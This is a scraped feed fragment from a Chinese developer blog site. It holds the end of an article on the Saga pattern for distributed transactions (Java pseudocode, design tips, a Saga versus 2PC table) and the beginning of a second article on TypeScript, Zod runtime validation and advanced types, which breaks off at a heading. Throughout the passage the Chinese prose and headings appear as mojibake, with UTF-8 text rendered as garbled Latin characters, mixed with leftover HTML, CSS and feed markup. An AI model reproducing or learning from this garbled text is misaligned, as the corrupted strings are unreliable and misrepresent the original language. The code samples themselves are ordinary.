<h2 data-id="heading-10">äº”ã€ä¸€ä¸ªä¸‹å•åœºæ™¯çš„ Saga ç¤ºä¾‹ï¼ˆJava æ€è·¯ï¼‰</h2>
<h3 data-id="heading-11">æ­£å‘æµç¨‹</h3>
<ol>
<li>åˆ›å»ºè®¢å•ï¼ˆOrder Serviceï¼‰</li>
<li>æ‰£å‡ä½™é¢ï¼ˆPayment Serviceï¼‰</li>
<li>æ‰£å‡åº“å­˜ï¼ˆInventory Serviceï¼‰</li>
</ol>
<h3 data-id="heading-12">è¡¥å¿æµç¨‹</h3>
<ul>
<li>åº“å­˜å¤±è´¥ â†’ é€€æ¬¾ â†’ å–æ¶ˆè®¢å•</li>
</ul>
<h3 data-id="heading-13">ä¼ªä»£ç ç¤ºä¾‹ï¼ˆç¼–æ’å¼ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrderSaga</span><span class="hljs-params">(CreateOrderCmd cmd)</span> {
    <span class="hljs-keyword">try</span> {
        orderService.create(cmd);
        paymentService.pay(cmd);
        inventoryService.deduct(cmd);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        inventoryService.compensate(cmd);
        paymentService.refund(cmd);
        orderService.cancel(cmd);
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre>
<blockquote>
<p>çœ‹èµ·æ¥å¾ˆæ™®é€šï¼Œå¯¹å§ï¼Ÿ</p>
<p><strong>ä½†å®ƒè§£å†³çš„æ˜¯åˆ†å¸ƒå¼äº‹åŠ¡è¿™ä¸ªâ€œä¸–çºªéš¾é¢˜â€ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-14">å…­ã€Saga çš„å‡ ä¸ªå…³é”®è®¾è®¡ç‚¹ï¼ˆè¡€æ³ªç»éªŒï¼‰</h2>
<h3 data-id="heading-15">1ï¸âƒ£ è¡¥å¿å¿…é¡»æ˜¯å¹‚ç­‰çš„</h3>
<ul>
<li>å¯èƒ½è¢«è°ƒç”¨å¤šæ¬¡</li>
<li>ä¸èƒ½å¤šé€€é’±ã€å¤šåŠ åº“å­˜</li>
</ul>
<blockquote>
<p><strong>å¹‚ç­‰ä¸æ˜¯ä¼˜åŒ–ï¼Œæ˜¯åº•çº¿ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-16">2ï¸âƒ£ è¡¥å¿ â‰  å®Œå…¨å›æ»š</h3>
<ul>
<li>æœ‰äº›æ“ä½œä¸å¯é€†ï¼ˆæ¯”å¦‚å‘çŸ­ä¿¡ï¼‰</li>
<li>è¡¥å¿åªèƒ½â€œä¸šåŠ¡ä¸Šå¯¹ç­‰â€</li>
</ul>
<blockquote>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œ
<strong>æ—¶é—´ä¸èƒ½å€’æµï¼Œåªèƒ½å¯¹å†²ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-17">3ï¸âƒ£ ä¸€å®šè¦æœ‰çŠ¶æ€è¡¨</h3>
<ul>
<li>Saga å®ä¾‹çŠ¶æ€</li>
<li>å½“å‰æ‰§è¡Œåˆ°å“ªä¸€æ­¥</li>
<li>æ˜¯å¦å·²è¡¥å¿</li>
</ul>
<p>å¦åˆ™ï¼š</p>
<blockquote>
<p>ç³»ç»Ÿä¸€é‡å¯ï¼Œä½ ä¼šå¤±å¿†ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-18">ä¸ƒã€Saga vs 2PCï¼ˆå¿«é€Ÿå¯¹æ¯”ï¼‰</h2>



































<table><thead><tr><th>ç»´åº¦</th><th>Saga</th><th>2PC</th></tr></thead><tbody><tr><td>ä¸€è‡´æ€§</td><td>æœ€ç»ˆä¸€è‡´</td><td>å¼ºä¸€è‡´</td></tr><tr><td>æ€§èƒ½</td><td>é«˜</td><td>ä½</td></tr><tr><td>å®ç°å¤æ‚åº¦</td><td>ä¸­</td><td>é«˜</td></tr><tr><td>å¯ç”¨æ€§</td><td>é«˜</td><td>ä½</td></tr><tr><td>å¾®æœåŠ¡å‹å¥½åº¦</td><td>â­â­â­â­â­</td><td>â­</td></tr></tbody></table>
<p>ç»“è®ºä¸€å¥è¯ï¼š</p>
<blockquote>
<p><strong>å¾®æœåŠ¡æ—¶ä»£ï¼Œç”¨ Sagaï¼›é“¶è¡Œæ ¸å¿ƒï¼Œç”¨ 2PCã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-19">å…«ã€Java æŠ€æœ¯æ ˆä¸­çš„ Saga å®è·µ</h2>
<p>å¸¸è§ç»„åˆï¼š</p>
<ul>
<li>Spring Boot</li>
<li>Spring Transaction</li>
<li>æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆKafka / RocketMQï¼‰</li>
<li>çŠ¶æ€è¡¨ + å®šæ—¶è¡¥å¿</li>
</ul>
<p>è¿›é˜¶æ¡†æ¶ï¼š</p>
<ul>
<li>Axon</li>
<li>Eventuate Tram</li>
<li>è‡ªç ” Saga Coordinatorï¼ˆå¾ˆå¤šå…¬å¸æœ€ç»ˆéƒ½ä¼šèµ°è¿™æ¡è·¯ï¼‰</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜]]></title>    <link>https://juejin.cn/post/7592759140038180905</link>    <guid>https://juejin.cn/post/7592759140038180905</guid>    <pubDate>2026-01-08T09:29:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038180905" data-draft-id="7592789801708863529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T09:29:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ´ç»´å—"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588332413"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588332413/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ´ç»´å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:32.000Z" title="Thu Jan 08 2026 09:29:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ ¸å¿ƒç†å¿µ</strong></p>
<ul>
<li><strong>TypeScript ç±»å‹æ¨æ–­</strong>ï¼šæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯ï¼ŒåŒæ—¶ä¸ºç¼–è¾‘å™¨æä¾›æ™ºèƒ½æç¤ºï¼ˆè‡ªåŠ¨è¡¥å…¨ã€æ‚¬æµ®ç±»å‹ä¿¡æ¯ï¼‰</li>
<li><strong>æ³›å‹çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šè®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</li>
</ul>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆæœ‰äº† TypeScript è¿˜éœ€è¦ Zodï¼Ÿ</h2>
<h3 data-id="heading-1">æœ¬è´¨åŒºåˆ«</h3>

























<table><thead><tr><th/><th>TypeScript</th><th>Zod</th></tr></thead><tbody><tr><td>ä½œç”¨æ—¶æœº</td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr><tr><td>ç¼–è¯‘å</td><td>ç±»å‹ä¿¡æ¯å®Œå…¨æ“¦é™¤</td><td>éªŒè¯é€»è¾‘ä¿ç•™</td></tr><tr><td>ä¿æŠ¤èŒƒå›´</td><td>ä½ å†™çš„ä»£ç </td><td>å¤–éƒ¨è¿›æ¥çš„æ•°æ®</td></tr></tbody></table>
<h3 data-id="heading-2">TypeScript çš„å±€é™</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// ç¼–è¯‘åç±»å‹ä¿¡æ¯å®Œå…¨æ¶ˆå¤±</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse); <span class="hljs-comment">// è¿è¡Œæ—¶æ²¡æœ‰ä»»ä½•éªŒè¯ï¼</span>
</code></pre>
<p>å¦‚æœ API è¿”å› <code>{ name: 123, age: "abc" }</code>ï¼ŒTypeScript ä¸ä¼šæŠ¥é”™ï¼Œç¨‹åºä¼šå¸¦ç€é”™è¯¯æ•°æ®ç»§ç»­è¿è¡Œã€‚</p>
<h3 data-id="heading-3">Zod çš„ä»·å€¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>(),
});

<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse)); 
<span class="hljs-comment">// æ•°æ®ä¸ç¬¦åˆ schema ä¼šç›´æ¥æŠ›é”™</span>
</code></pre>
<h3 data-id="heading-4">ä½¿ç”¨åœºæ™¯åˆ¤æ–­</h3>

















<table><thead><tr><th>æ•°æ®æ¥æº</th><th>ç”¨ä»€ä¹ˆ</th></tr></thead><tbody><tr><td>å¤–éƒ¨è¿›æ¥çš„ï¼ˆAPIã€ç”¨æˆ·è¾“å…¥ã€envã€localStorageï¼‰</td><td>Zod</td></tr><tr><td>å†…éƒ¨æµè½¬çš„ï¼ˆpropsã€stateã€å‡½æ•°ç­¾åï¼‰</td><td>TS ç±»å‹</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">äºŒã€Zod çš„æ ¸å¿ƒä¼˜åŠ¿ï¼šSchema å³ç±»å‹</h2>
<h3 data-id="heading-6"><code>z.infer</code> è‡ªåŠ¨å¯¼å‡ºç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åªå†™ä¸€æ¬¡ schema</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">email</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">email</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">0</span>),
});

<span class="hljs-comment">// è‡ªåŠ¨å¯¼å‡º TypeScript ç±»å‹ï¼Œä¸ç”¨æ‰‹å†™ interface</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-comment">// ç­‰ä»·äºï¼štype User = { name: string; email: string; age: number }</span>
</code></pre>
<h3 data-id="heading-7">å¯¹æ¯”ä¼ ç»Ÿæ–¹å¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ ä¼ ç»Ÿæ–¹å¼ï¼šå†™ä¸¤éï¼Œå®¹æ˜“ä¸åŒæ­¥</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateUser</span>(<span class="hljs-params">data: <span class="hljs-built_in">unknown</span></span>): <span class="hljs-title class_">User</span> {
  <span class="hljs-comment">// æ‰‹å†™éªŒè¯é€»è¾‘...</span>
}

<span class="hljs-comment">// âœ… Zodï¼šSingle Source of Truth</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({...});
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data); <span class="hljs-comment">// éªŒè¯ + ç±»å‹æ¨å¯¼ä¸€æ­¥åˆ°ä½</span>
</code></pre>
<h3 data-id="heading-8">å¥½å¤„</h3>
<ul>
<li><strong>æ”¹ä¸€å¤„ï¼Œå¤„å¤„ç”Ÿæ•ˆ</strong> â€” ä¿®æ”¹ schemaï¼Œç±»å‹è‡ªåŠ¨æ›´æ–°</li>
<li><strong>IDE å…¨ç¨‹æœ‰æç¤º</strong> â€” parse åçš„æ•°æ®æœ‰å®Œæ•´ç±»å‹æ”¯æŒ</li>
<li><strong>å¤æ‚ç±»å‹ä¹Ÿèƒ½æ¨å¯¼</strong> â€” unionã€optionalã€transform ç­‰éƒ½èƒ½æ­£ç¡®æ¨å¯¼</li>
</ul>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€Zod éªŒè¯å¤±è´¥çš„å¤„ç†</h2>
<h3 data-id="heading-10">æ–¹å¼ä¸€ï¼š<code>parse</code> - ç›´æ¥æŠ›é”™</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(apiResponse);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> z.<span class="hljs-property">ZodError</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">errors</span>);
    <span class="hljs-comment">// [{ path: ['email'], message: 'Invalid email' }]</span>
  }
}
</code></pre>
<h3 data-id="heading-11">æ–¹å¼äºŒï¼š<code>safeParse</code> - ä¸æŠ›é”™ï¼ˆæ¨èï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(apiResponse);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// result.data ç±»å‹å®‰å…¨</span>
} <span class="hljs-keyword">else</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">error</span>.<span class="hljs-title function_">flatten</span>()); <span class="hljs-comment">// è¯¦ç»†é”™è¯¯ä¿¡æ¯</span>
}
</code></pre>
<h3 data-id="heading-12">ç†è§£ <code>safeParse</code> è¿”å›å€¼</h3>
<p><code>result</code> æ˜¯ <strong>Zod ç”Ÿæˆçš„ç»“æœå¯¹è±¡</strong>ï¼Œä¸æ˜¯åç«¯æ•°æ®ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// éªŒè¯æˆåŠŸæ—¶</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">data</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> } }

<span class="hljs-comment">// éªŒè¯å¤±è´¥æ—¶</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-title class_">ZodError</span> }
</code></pre>
<h3 data-id="heading-13">å®é™…é¡¹ç›®å¤„ç†æ¨¡å¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${id}</span>`</span>);
  <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(json);
  
  <span class="hljs-keyword">if</span> (!result.<span class="hljs-property">success</span>) {
    <span class="hljs-title function_">reportError</span>(<span class="hljs-string">'API schema mismatch'</span>, result.<span class="hljs-property">error</span>); <span class="hljs-comment">// ä¸ŠæŠ¥ç›‘æ§</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// æˆ–è¿”å›é»˜è®¤å€¼ã€æŠ›ä¸šåŠ¡å¼‚å¸¸</span>
  }
  
  <span class="hljs-keyword">return</span> result.<span class="hljs-property">data</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-14">å››ã€TypeScript é«˜çº§ç±»å‹ç³»ç»Ÿ</h2>
<blockquote>
<p>TypeScript çš„ç±»å‹ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯ä¸€é—¨<strong>å›¾çµå®Œå¤‡çš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€</strong></p>
<p><strong>æ ¸å¿ƒä»·å€¼ï¼šé€šè¿‡ç±»å‹æ¨æ–­ï¼ŒæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯</strong></p>
</blockquote>
<h3 data-id="heading-15">æ³›å‹ï¼šç±»å‹å±‚é¢çš„"å‡½æ•°"</h3>
<blockquote>
<p><strong>æ³›å‹çš„æ ¸å¿ƒä»·å€¼ï¼šè®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</strong></p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Wrapper</span>&lt;T&gt; = { <span class="hljs-attr">value</span>: T; <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span> };

<span class="hljs-keyword">type</span> <span class="hljs-title class_">WrappedString</span> = <span class="hljs-title class_">Wrapper</span>&lt;<span class="hljs-built_in">string</span>&gt;;  <span class="hljs-comment">// { value: string; timestamp: number }</span>
</code></pre>
<h3 data-id="heading-16">æ¡ä»¶ç±»å‹ï¼šç±»å‹å±‚é¢çš„ <code>if-else</code></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"hello"</span>&gt;;  <span class="hljs-comment">// true</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;;      <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-17"><code>infer</code>ï¼šç±»å‹å±‚é¢çš„æ¨¡å¼åŒ¹é…</h3>
<p><code>infer</code> çš„ä½œç”¨ï¼š<strong>"è¿™ä¸ªä½ç½®çš„ç±»å‹æˆ‘ä¸çŸ¥é“ï¼Œä½†å¸®æˆ‘æ•è·å‡ºæ¥ï¼Œåé¢æˆ‘è¦ç”¨"</strong></p>
<p>ç±»æ¯”æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·ç»„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">æ­£åˆ™ï¼š/<span class="hljs-title class_">Hello</span> (\w+)/  â†’  æ•è·æ‹¬å·é‡ŒåŒ¹é…åˆ°çš„å†…å®¹
ç±»å‹ï¼šT <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt;  â†’  æ•è· <span class="hljs-title class_">Promise</span> é‡Œé¢çš„ç±»å‹
</code></pre>
<h4 data-id="heading-18">ä¸ºä»€ä¹ˆ <code>infer</code> åªèƒ½å’Œ <code>extends</code> ä¸€èµ·ç”¨ï¼Ÿ</h4>
<p><code>infer</code> éœ€è¦ä¸€ä¸ª<strong>åŒ¹é…ä¸Šä¸‹æ–‡</strong>æ‰èƒ½çŸ¥é“è¦æ•è·ä»€ä¹ˆï¼Œ<code>extends</code> æä¾›äº†è¿™ä¸ªä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : <span class="hljs-built_in">never</span>
<span class="hljs-comment">//        â†‘ è¿™æ˜¯ä¸€ä¸ª"æ¨¡å¼"</span>
<span class="hljs-comment">//                  â†‘ åœ¨è¿™ä¸ªæ¨¡å¼é‡Œï¼ŒU æ˜¯è¦æ•è·çš„éƒ¨åˆ†</span>
</code></pre>
<p>TS çš„æ‰§è¡Œé€»è¾‘ï¼š</p>
<ol>
<li>æ‹¿ <code>T</code> å»åŒ¹é… <code>Promise&lt;?&gt;</code> è¿™ä¸ªæ¨¡å¼</li>
<li>å¦‚æœåŒ¹é…æˆåŠŸï¼ŒæŠŠ <code>?</code> ä½ç½®çš„ç±»å‹èµ‹å€¼ç»™ <code>U</code></li>
<li>ç„¶å <code>U</code> å°±å¯ä»¥åœ¨ <code>?</code> åé¢ä½¿ç”¨äº†</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ ä¸èƒ½å•ç‹¬ä½¿ç”¨ infer</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bad</span>&lt;T&gt; = infer U;  <span class="hljs-comment">// é”™è¯¯ï¼šinfer åªèƒ½åœ¨æ¡ä»¶ç±»å‹çš„ extends å­å¥ä¸­ä½¿ç”¨</span>
<span class="hljs-comment">// å› ä¸º TS ä¸çŸ¥é“ U åº”è¯¥ä»å“ªé‡Œæ¨æ–­ï¼Œæ²¡æœ‰æ¨¡å¼åŒ¹é…å°±æ²¡æœ‰"æ•è·"çš„æ¥æº</span>
</code></pre>
<p>å°±åƒæ­£åˆ™è¡¨è¾¾å¼çš„æ•è·ç»„å¿…é¡»åœ¨åŒ¹é…æ¨¡å¼é‡Œï¼Œä¸èƒ½å•ç‹¬å†™ <code>(\w+)</code>ã€‚</p>
<h4 data-id="heading-19">ç¤ºä¾‹ï¼šæå– Promise å†…éƒ¨ç±»å‹</h4>
